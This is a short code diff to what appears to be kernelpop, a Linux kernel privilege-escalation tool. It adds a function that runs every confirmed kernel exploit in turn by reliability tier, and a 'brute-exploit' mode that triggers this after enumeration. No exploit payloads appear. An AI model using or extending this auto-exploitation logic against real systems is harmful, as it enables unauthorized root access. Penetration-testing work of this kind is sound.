@@ -325,6 +325,22 @@ def brute_force_enumerate(identified_exploits):
 	return confirmed_vulnerable
 
 
+def brute_force_exploit(confirmed_exploits):
+	color_print("\t[*] attempting to exploit confirmed exploits", color="blue")
+	if len(confirmed_exploits[HIGH_RELIABILITY]) > 0:
+		color_print("\t[[ high reliability ]]", color="green")
+		for high_exploit in confirmed_exploits[HIGH_RELIABILITY]:
+			high_exploit.exploit()
+	if len(confirmed_exploits[MEDIUM_RELIABILITY]) > 0:
+		color_print("\t[[ medium reliability ]]", color="yellow")
+		for medium_exploit in confirmed_exploits[MEDIUM_RELIABILITY]:
+			medium_exploit.exploit()
+	if len(confirmed_exploits[LOW_RELIABILITY]) > 0:
+		color_print("\t[[ low reliability ]]", color="red")
+		for low_exploit in confirmed_exploits[LOW_RELIABILITY]:
+			low_exploit.exploit()
+
+
 def display_ordered_exploits(ordered_exploits, begin_message=None, fail_message=None, color=None):
 	"""
 
@@ -403,12 +419,14 @@ def kernelpop(mode="enumerate", uname=None):
 	for key_val in identified_exploits["confirmed"]:
 		merged_exploits[key_val] = identified_exploits["confirmed"][key_val] + identified_exploits["potential"][key_val]
 
-	if mode == "brute-enumerate":
+	if "brute" in mode:
 		confirmed_vulnerable = brute_force_enumerate(merged_exploits)
 
 		display_ordered_exploits(confirmed_vulnerable, begin_message="[+] confirmed exploits",
 								 fail_message="[-] no exploits were confirmed for this kernel")
 
+		if "exploit" in mode:
+			brute_force_exploit(confirmed_vulnerable)
 
 if __name__ == "__main__":
 	kernelpop()
